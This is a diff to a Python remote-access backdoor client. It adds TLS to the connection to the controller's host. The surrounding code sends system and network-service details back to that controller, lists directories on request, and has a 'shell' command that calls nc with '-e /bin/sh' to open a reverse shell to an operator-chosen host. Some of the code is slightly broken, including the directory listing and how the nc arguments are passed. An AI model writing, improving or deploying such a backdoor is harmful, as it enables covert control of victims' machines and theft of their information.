@@ -11,7 +11,7 @@ import subprocess as sp
 import socket
 
 # list of the modules you have to install manually
-imports = ["requests", "keyboard", "cryptography"]
+imports = ["cryptography"]
 try:
     for i in imports:
         globals()[i] = importlib.import_module(i)
@@ -41,9 +41,14 @@ def encrypt(data):
 
 for i in range(1, TIMEOUT):
     try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         if ssl:
             cert = ssl.get_server_certificate((HOST, PORT), ssl_version=ssl.PROTOCOL_TLS_CLIENT)
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            with open("/tmp/cert.pem", "w") as f:
+                f.write(cert)
+            context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+            context.load_verify_locations("/tmp/cert.pem")
+            s = context.wrap_socket(s, server_hostname=HOST)
         s.connect((HOST, PORT))
     except socket.error as e:
         print("Trying to connect")
@@ -103,16 +108,14 @@ for i in range(1, TIMEOUT):
             infos["services"] = sp.getoutput("ss -tulpn")
             s.send(encrypt(json.dumps(infos)))
         elif option == "dir":
-            # Get Directory
             try:
                 os.listdir(args)
                 s.send(encrypt(str(os.listdir())))
             except Exception as e:
                 s.send(encrypt("!" + str(e)))
         elif option == "exit":
-            # clear everything
+            # Cleanup
             exit()
         elif option == "shell":
-            # open a shell
             sp.Popen(["nc", args[0], args[1], "-e /bin/sh"])
             s.send(encrypt("Shell Opened"))
